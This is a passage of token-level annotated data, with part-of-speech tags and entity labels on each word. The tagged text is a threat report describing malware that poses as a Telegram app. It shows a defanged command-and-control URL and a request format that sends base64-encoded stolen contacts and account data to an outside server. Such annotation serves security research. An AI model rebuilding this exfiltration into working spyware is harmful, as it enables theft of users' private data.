and	CC	O
Iran	NNP	LOCATION
.	.	O
Version	NN	O
1.0	CD	O
-	:	O
circa	NN	O
2015	CD	O
The	DT	O
first	JJ	O
version	NN	O
of	IN	O
the	DT	O
malware	NN	O
that	IN	O
we	PRP	O
found	VBD	O
(	(	O
EC5A6F0E743F4B858ABA9DE96A33FB0C	NNP	O
)	)	O
is	VBZ	O
pretty	JJ	O
simple	NN	O
.	.	O
It	PRP	O
has	VBZ	O
only	RB	O
two	CD	O
functions	NNS	O
-	:	O
stealing	VBG	EFFECT
contacts	NNS	EFFECT
from	IN	O
the	DT	O
address	NN	O
book	NN	O
and	CC	O
accounts	NNS	O
registered	VBN	O
on	IN	O
the	DT	O
victim	NN	O
device	NN	O
.	.	O
The	DT	O
malware	NN	O
mimics	VBZ	O
a	DT	O
Telegram	NNP	O
application	NN	O
.	.	O
When	WRB	O
the	DT	O
connection	NN	O
is	VBZ	O
stable	JJ	O
,	,	O
the	DT	O
malware	NN	O
sends	VBZ	O
a	DT	O
request	NN	O
to	TO	O
the	DT	O
C2	NNP	O
server	NN	O
,	,	O
encoding	VBG	O
the	DT	O
stolen	VBN	O
data	NNS	O
(	(	O
contacts	NNS	O
and	CC	O
accounts	NNS	O
)	)	O
in	IN	O
base64	NN	O
:	:	O
"	JJ	O
hxxp://www.rhubarb2[.]com	NN	O
/	NNP	O
telg	NN	O
/	NNP	O
sv	NN	O
/	NNP	O
sv[.]php	NN	O
"	NNP	O
{	(	O
'	POS	O
i	NN	O
d	VBP	O
'	''	O
:	:	O
Base64Encode(id	NN	O
)	)	O
,	,	O
'	''	O
data	NNS	O
'	POS	O
:	:	O
Base64Encode(contacts	NNS	O
)	)	O
}	)	O
"	JJ	O
hxxp://www.rhubarb2[.]com	NN	O
/	NNP	O
get	VB	O
/	NNP	O
index[.]php?id=	NN	O
"	NNP	O
+	NNP	O
Base64Encode("gogo	NNP	O
"	NNP	O
)	)	O
+	NNP	O
"	NNP	O
&	CC	O
user=	JJ	O
"	NN	O
+	NNP	O
Base64Encode("TelgramGp	NNP	O
"	NNP	O
)	)	O
+	NNP	O
"	NNP	O
&	CC	O
pass=	NN	O
"	NN	O
+	NNP	O
Base64Encode("TelgramGp	NNP	O
"	NNP	O
)	)	O
+	NNP	O
"	NNP	O
&	CC	O
data=	NN	O
"	NN	O
+	NNP	O
Base64Encode(accounts	NNP	O
)	)	O
)	)	O
